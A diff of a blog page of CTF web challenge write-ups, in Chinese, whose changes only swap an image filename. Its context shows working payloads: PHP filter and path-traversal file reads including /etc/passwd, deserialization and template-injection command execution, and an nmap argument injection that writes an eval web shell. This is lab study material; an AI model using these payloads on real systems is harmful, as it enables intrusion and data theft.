 <pre class="language-txt" data-language="txt"><code class="language-txt">category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181832719.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181832719.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIGZsYWd7MWUwNzY5N2ItYjc1OC00ZDNhLWFhOTEtYmEwNWM0ZDg4MDQ3fQo/Pgo=</code></pre>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">&lt;!-- Can you read this flag? --&gt;</span>
 <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -471,13 +471,13 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token delimiter important">?&gt;</span></span>
 </code></pre>
 <h2 id="网鼎杯-2020-朱雀组-phpweb"><a class="headerlink" href="#网鼎杯-2020-朱雀组-phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181106083.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181106083.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">func=date&amp;p=Y-m-d+h%3Ai%3As+a</code></pre>
 <p>调用 date 函数并传入 “Y-m-d h:i:s a”</p>
 <p>尝试获取源码</p>
 <p>尝试调用 <code>readfile</code> <code>file_get_contents</code> <code>highlight_file</code> 函数</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">func=readfile&amp;p=index.php</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181117314.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181117314.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
     <span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
@@ -535,21 +535,21 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <pre class="language-txt" data-language="txt"><code class="language-txt">func=unserialize&amp;p=O:4:"Test":2:{s:4:"func";s:6:"system";s:1:"p";s:25:"cat $(find / -name flag*)";}</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181522383.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181522383.avif" alt="" loading="lazy"></p>
 <p>反斜杠绕过黑名单</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205181240901.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205181240901.avif" alt="" loading="lazy"></p>
 <h2 id="GWCTF-2019-我有一个数据库"><a class="headerlink" href="#GWCTF-2019-我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180112027.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180112027.avif" alt="" loading="lazy"></p>
 <p>编码有问题</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180113024.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180113024.avif" alt="" loading="lazy"></p>
 <p>扫目录</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180102251.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180101234.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180103653.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180105132.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180216915.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180109221.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180111277.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180102251.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180101234.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180103653.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180105132.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180216915.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180109221.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180111277.avif" alt="" loading="lazy"></p>
 <p>phpMyAdmin 版本号是 4.8.1</p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOC0xMjYxMy8=" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
@@ -578,9 +578,9 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
     </div>
     </a>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?target=db_sql.php%253f/../../../../../../../../etc/passwd</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180131374.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180131374.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?target=db_sql.php%253f/../../../../../../../../flag</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180149635.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180149635.avif" alt="" loading="lazy"></p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYm1qb2tlci9wLzk4OTc0MzYuaHRtbA==" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
     <div class="tag-link-bottom">
@@ -595,16 +595,16 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
     </div>
     </a>
 <pre class="language-php" data-language="php"><code class="language-php">SELECT '<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span>';</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180220735.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180222847.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180220735.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180222847.avif" alt="" loading="lazy"></p>
 <p>查看 SESSION ID</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180223095.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180223095.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_5nl1lmmrps8lfjr2l8upr9h9g3</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180228865.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180249578.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180305568.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180228865.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180249578.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180305568.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">SHOW</span> variables <span class="token constant">LIKE</span> <span class="token string single-quoted-string">'%datadir%'</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205180305631.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205180305631.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?target=db_sql.php%253f/../../../../../../var/lib/mysql/data/test/test.frm</code></pre>
 <h2 id="BJDCTF2020-ZJCTF，不过如此"><a class="headerlink" href="#BJDCTF2020-ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -629,8 +629,8 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <p>php://input post 传输 I have a dream</p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=</code></pre>
 <pre class="language-txt" data-language="txt"><code class="language-txt">file=php://filter/read=convert.base64-encode/resource=next.php</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172113671.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172118653.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172113671.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172118653.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</code></pre>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -692,9 +692,9 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
     </div>
     </a>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?\S*={${phpinfo()}}</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172258774.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172258774.avif" alt="" loading="lazy"></p>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?\S*=${getFlag()}&amp;cmd=system('cat /flag');</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172303594.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172303594.avif" alt="" loading="lazy"></p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly93d3cubDFjaC5jbi9pbmRleC5waHAvYXJjaGl2ZXMvNzYv" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
     <div class="tag-link-bottom">
@@ -709,10 +709,10 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
     </div>
     </a>
 <pre class="language-txt" data-language="txt"><code class="language-txt">?\S*=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103))}</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172304509.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172304509.avif" alt="" loading="lazy"></p>
 <h2 id="GXYCTF2019-禁止套娃"><a class="headerlink" href="#GXYCTF2019-禁止套娃"></a>[GXYCTF2019]禁止套娃</h2>
 <p>扫目录发现 .git</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205170927729.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205170927729.avif" alt="" loading="lazy"></p>
 <p>GitHack 获取源码</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
@@ -743,27 +743,27 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <p>无参数RCE</p>
 <p><code>print_r(scandir('.'));</code> 查看当前目录及文件</p>
 <p>限制不含参数，即用 current(localeconv()) 代替</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205171952593.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205171952593.avif" alt="" loading="lazy"></p>
 <p>flag.php 为倒数第二个值，反转顺序后向前一位将指向 flag.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205171959165.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205171959165.avif" alt="" loading="lazy"></p>
 <p>返回随机键名后反转键名与键值，多次随机后得到想要的键值</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">array_rand</span><span class="token punctuation">(</span><span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172014232.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172014232.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205172046894.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205172046894.avif" alt="" loading="lazy"></p>
 <h2 id="BJDCTF2020-The-mystery-of-ip"><a class="headerlink" href="#BJDCTF2020-The-mystery-of-ip"></a>[BJDCTF2020]The mystery of ip</h2>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151538688.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151538688.avif" alt="" loading="lazy"></p>
 <p>通过 X-Forwarded-For 或 Client-IP 伪造 ip 参数</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151648831.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151648831.avif" alt="" loading="lazy"></p>
 <p>Smarty SSTI PHP</p>
 <p>{$smarty.version}</p>
 <p>3.1.34-dev-7</p>
 <p>{if phpinfo()}{/if}</p>
 <p>{php}phpinfo();{/php} （仅在Smarty3.1的SmartyBC中有效）</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151602029.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151602029.avif" alt="" loading="lazy"></p>
 <p>X-Forwarded-For: {system(‘cat /flag’)}</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151549876.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151549876.avif" alt="" loading="lazy"></p>
 <h2 id="BUUCTF-2018-Online-Tool"><a class="headerlink" href="#BUUCTF-2018-Online-Tool"></a>[BUUCTF 2018]Online Tool</h2>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -785,7 +785,7 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <p>host 随便传个 ip 后执行 nmap 命令</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151022063.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151022063.avif" alt="" loading="lazy"></p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvZW4vZnVuY3Rpb24uZXNjYXBlc2hlbGxhcmcv" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
     <div class="tag-link-bottom">
@@ -819,27 +819,27 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 ' <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ba2in9a"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> -oG ba2in9a.php '
 
 ' \<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>\?php</span> <span class="token attr-name">@eval\(\$_POST\[\"ba2in9a\"\]\)\;\?\</span><span class="token punctuation">&gt;</span></span> -oG ba2in9a.php '</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205151155039.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205151155039.avif" alt="" loading="lazy"></p>
 <h2 id="RoarCTF-2019-Easy-Java"><a class="headerlink" href="#RoarCTF-2019-Easy-Java"></a>[RoarCTF 2019]Easy Java</h2>
 <p>账号密码分别是 <code>admin</code> <code>admin888</code></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141127088.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141127088.avif" alt="" loading="lazy"></p>
 <p>登陆后没有任何可用信息</p>
 <p>查看 help 页面</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141119414.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141119414.avif" alt="" loading="lazy"></p>
 <p>抛出异常 java.io.FileNotFoundException:{help.docx}</p>
 <p>请求方式改为 post</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141134911.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141136308.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141134911.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141136308.avif" alt="" loading="lazy"></p>
 <p>没有可用信息</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141139720.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141139720.avif" alt="" loading="lazy"></p>
 <p>查看别人的WP得知可以查看 <code>WEB-INF</code>/<code>web.xml</code></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141420410.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141422389.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141420410.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141422389.avif" alt="" loading="lazy"></p>
 <p>servlet-class 存放在 /WEB-INF/classes 目录下</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141420675.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141435975.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141420675.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141435975.avif" alt="" loading="lazy"></p>
 <p>base64 解码即可得到 flag</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141438549.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141438549.avif" alt="" loading="lazy"></p>
 <h2 id="GXYCTF2019-BabyUpload"><a class="headerlink" href="#GXYCTF2019-BabyUpload"></a>[GXYCTF2019]BabyUpload</h2>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -884,16 +884,16 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <p>上传 .htaccess</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141027292.avif" alt="" loading="lazy"></p>
